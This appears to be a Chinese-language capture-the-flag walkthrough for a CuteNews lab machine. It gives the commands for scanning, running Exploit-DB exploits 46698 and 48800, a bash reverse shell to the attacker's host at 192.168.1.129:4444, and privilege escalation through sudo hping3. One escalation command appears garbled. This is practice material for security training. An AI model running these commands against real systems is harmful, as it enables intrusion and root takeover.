目标：2个flag

级别：初级

1、主机探测

netdiscover -r 192.168.1.0/24

2、通过nmap进行端口扫描

nmap -A -sS -sV -v -p- 192.168.1.5

查看开放22、80、88、110、995端口

3、WEB渗透测试

3.1 使用dirb进行扫描发现php页面

dirb http://192.168.1.5 -X .php

3.2 访问index.php首页时显示为CuteNews

3.3 使用searchsploit查找有metasploit的脚本

searchsploit  CuteNews

3.4 在metasploit中未查到该脚本

复制exploit-db到metasploit模块中

cp /usr/share/exploitdb/exploits/php/remote/46698.rb /usr/share/metasploit-framework/modules/exploits
3.5 由于该利用模块需要提供登录账号和密码，需要注册账号但是不显示验证码，无法注册

3.6 使用python脚本利用工具,需要修改脚本

cp /usr/share/exploitdb/exploits/php/webapps/48800.py ./

PS: 由于使用的脚本指定的页面为CuteNews，需要删除脚本中包含CuteNews的所有字段

3.7 使用python脚本进行利用

python3 48800.py

3.8 设置反弹shell

在kali中开启监听服务

nc -nlvp 4444

设置反弹shell

echo 'bash -i >& /dev/tcp/192.168.1.129/4444 0>&1' | bash

3.9 查看sudo权限，得到www-data拥有hping3的sudo权限

sudo -l

4、系统提权

4.1 使用hping3提权

/usr/sbin/hping3id

4.2 获取flag信息

cat /root/root.txt
